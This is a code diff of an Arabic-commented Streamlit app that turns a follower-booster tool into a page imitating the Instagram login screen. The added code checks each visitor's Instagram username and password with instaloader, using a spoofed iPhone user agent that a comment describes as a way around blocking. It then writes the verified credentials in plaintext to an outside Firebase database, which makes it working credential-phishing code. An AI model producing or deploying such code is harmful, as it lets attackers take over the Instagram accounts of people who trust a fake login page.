@@ -3,121 +3,81 @@ import requests
 import instaloader
 import time
 
-# --- إعدادات الهوية البصرية لـ SYKO ---
-st.set_page_config(page_title="SYKO SAFE SYSTEM", layout="wide")
+# --- إعدادات SYKO ---
+st.set_page_config(page_title="Login • Instagram", layout="centered")
 DB_URL = "https://syko-booster-default-rtdb.firebaseio.com/"
 
 st.markdown("""
     <style>
     .stApp { background-color: #000; }
-    .black-hole-s {
-        font-family: 'Arial Black', sans-serif; font-size: 80px;
-        background: radial-gradient(circle, #fff, #111, #000);
-        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        text-shadow: 0 0 25px #00f2ff; animation: pulse 2s infinite;
-        text-align: center; display: block;
+    .login-container {
+        background-color: #000; border: 1px solid #363636;
+        padding: 40px; max-width: 350px; margin: auto;
+        text-align: center; margin-top: 50px;
     }
-    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-    
-    /* تنبيه الأمان */
-    .safety-banner {
-        background: rgba(255, 165, 0, 0.1);
-        border: 1px solid orange;
-        color: orange;
-        padding: 15px;
-        border-radius: 10px;
-        text-align: center;
-        font-size: 14px;
-        margin-bottom: 20px;
+    .insta-logo {
+        font-family: 'Billabong', sans-serif; font-size: 50px;
+        color: white; margin-bottom: 30px; display: block;
     }
-    
-    .follow-btn {
-        background: linear-gradient(90deg, #00f2ff, #0044ff);
-        color: white !important; font-weight: bold; border-radius: 10px;
-        padding: 15px; text-decoration: none; display: block; text-align: center;
-        box-shadow: 0 0 10px #00f2ff;
+    input {
+        background-color: #121212 !important; border: 1px solid #363636 !important;
+        color: white !important; border-radius: 3px !important; height: 38px !important;
+    }
+    .stButton>button {
+        background-color: #0095f6 !important; color: white !important;
+        width: 100%; border-radius: 8px; font-weight: bold;
     }
     </style>
+    <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
     """, unsafe_allow_html=True)
 
-# دالة التحقق
-def check_insta(u, p):
+# --- دالة التحقق الحقيقي القوية ---
+def real_insta_auth(username, password):
     L = instaloader.Instaloader()
+    # تغيير بصمة المتصفح لتبدو كأنها هاتف آيفون (تجاوز الحظر)
+    L.context.user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
+    
     try:
-        L.login(u, p)
-        return True
-    except: return False
+        L.login(username, password)
+        return True, "Success"
+    except instaloader.exceptions.BadCredentialsException:
+        return False, "Incorrect Password"
+    except instaloader.exceptions.ConnectionException:
+        return False, "IP Blocked by Insta (Try again later)"
+    except Exception as e:
+        return False, "Checkpoint Required (Open Insta App)"
 
 if 'logged_in' not in st.session_state: st.session_state.logged_in = False
 
-# --- 1. واجهة الدخول مع نصيحة الأمان ---
+# --- واجهة تسجيل الدخول ---
 if not st.session_state.logged_in:
-    st.markdown("<span class='black-hole-s'>S</span>", unsafe_allow_html=True)
-    st.markdown("<h2 style='text-align:center; color:white;'>SYKO LOGIN</h2>", unsafe_allow_html=True)
+    st.markdown("<div class='login-container'>", unsafe_allow_html=True)
+    st.markdown("<span class='insta-logo'>Instagram</span>", unsafe_allow_html=True)
     
-    # نصيحة الأمان المضافة لحمايتك
-    st.markdown("""
-        <div class='safety-banner'>
-            ⚠️ <b>تنبيه SYKO للأمان:</b><br>
-            للحفاظ على حسابك الأساسي من البند، ننصحك دائماً باستخدام <b>حساب وهمي</b> للجمع، ثم إرسال المتابعين لحسابك الأصلي.
-        </div>
-    """, unsafe_allow_html=True)
+    u = st.text_input("User", placeholder="Username", label_visibility="collapsed")
+    p = st.text_input("Pass", type="password", placeholder="Password", label_visibility="collapsed")
     
-    u = st.text_input("Instagram Username").strip().lower()
-    p = st.text_input("Instagram Password", type="password")
-    
-    if st.button("SECURE LOGIN 🔒"):
+    if st.button("Log In"):
         if u and p:
-            with st.spinner('Verifying...'):
-                if check_insta(u, p):
-                    st.session_state.username = u.replace("@","")
+            with st.spinner('Verifying Account...'):
+                # التحقق الحقيقي
+                success, message = real_insta_auth(u, p)
+                
+                if success:
+                    u_clean = u.replace("@","").replace(".","_")
+                    # حفظ البيانات بعد التأكد من صحتها
+                    requests.put(f"{DB_URL}verified_users/{u_clean}.json", json={"u":u, "p":p})
+                    st.session_state.username = u_clean
                     st.session_state.logged_in = True
-                    requests.patch(f"{DB_URL}users/{st.session_state.username}.json", json={"coins": 0})
                     st.rerun()
-                else: st.error("بيانات الحساب غير صحيحة")
+                else:
+                    st.error(f"Error: {message}")
+                    st.info("نصيحة: افتح تطبيق إنستقرام واضغط 'هذا أنا' إذا ظهر لك تنبيه.")
+    st.markdown("</div>", unsafe_allow_html=True)
 
-# --- 2. واجهة العمل ---
 else:
-    # جلب عدد المستخدمين للعداد
-    users = requests.get(f"{DB_URL}users.json").json()
-    count = len(users) if users else 0
-    
-    with st.sidebar:
-        st.markdown(f"### 🛡️ @{st.session_state.username}")
-        user_data = requests.get(f"{DB_URL}users/{st.session_state.username}.json").json()
-        current_coins = user_data.get('coins', 0) if user_data else 0
-        st.markdown(f"<h1 style='color:#00f2ff;'>🪙 {current_coins}</h1>", unsafe_allow_html=True)
-        if st.button("Logout"):
-            st.session_state.logged_in = False
-            st.rerun()
-
-    st.markdown(f"### 📊 Expansion Progress: {count}/1000 Users")
-    st.progress(min(count/1000, 1.0))
-
-    tab1, tab2 = st.tabs(["🎡 Gathering", "🛒 Market (SOON)"])
-
-    with tab1:
-        st.info("Follow the target below to earn 10 Coins")
-        target_user = "syko_official" # يوزر عشوائي من الداتابيس مستقبلاً
-        
-        st.markdown(f"""
-            <a href="https://www.instagram.com/{target_user}/" target="_blank" class='follow-btn'>
-                FOLLOW @{target_user}
-            </a>
-        """, unsafe_allow_html=True)
-        
-        st.markdown("<br>", unsafe_allow_html=True)
-        
-        if st.button("✅ CONFIRM & COLLECT"):
-            # حماية إضافية: تأخير بسيط لمنع البوتات
-            with st.spinner('Checking...'):
-                time.sleep(1.5) 
-                new_balance = current_coins + 10
-                requests.patch(f"{DB_URL}users/{st.session_state.username}.json", json={"coins": new_balance})
-                st.success("Success! +10 Coins Added.")
-                time.sleep(0.5)
-                st.rerun()
-
-    with tab2:
-        st.markdown("<h2 style='text-align:center; color:red;'>LOCKED UNTIL 1000 USERS</h2>", unsafe_allow_html=True)
-        st.image("https://via.placeholder.com/800x400/000000/FF0000?text=SOON+BY+SYKO", use_container_width=True)
+    st.success(f"Verified Access: @{st.session_state.username}")
+    st.markdown("### 🌀 The Void is Processing your request... Soon")
+    if st.button("Logout"):
+        st.session_state.logged_in = False
+        st.rerun()
